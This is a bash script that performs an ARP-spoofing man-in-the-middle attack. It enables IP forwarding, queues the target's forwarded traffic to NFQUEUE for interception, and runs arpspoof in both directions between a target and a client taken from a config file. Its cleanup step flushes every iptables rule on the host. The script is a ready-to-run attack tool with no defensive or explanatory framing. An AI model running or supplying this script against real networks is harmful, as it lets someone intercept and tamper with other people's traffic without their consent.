#!/bin/bash

if [[ $EUID -ne 0 ]]; then
  echo "Please run as root"
  exit 1
fi

target=$(jq -r '.target' config.json)
router=$(jq -r '.router' config.json)
client=$(jq -r '.client' config.json)
interface=$(jq -r '.interface' config.json)

trap 'end' INT

function end() {
  echo "Shutdown now..."
  kill $PID1
  kill $PID2
  iptables -F
  wait $PID1
  wait $PID2
}

echo 1 > /proc/sys/net/ipv4/ip_forward

sudo iptables -A FORWARD -d $target -j NFQUEUE --queue-num 0
sudo iptables -A FORWARD -s $target -j NFQUEUE --queue-num 0

# Start arpspoof commands in the background
arpspoof -i $interface -t $target $client > /dev/null 2>&1 &
PID1=$!
arpspoof -i $interface -t $client $target > /dev/null 2>&1 &
PID2=$!

cat
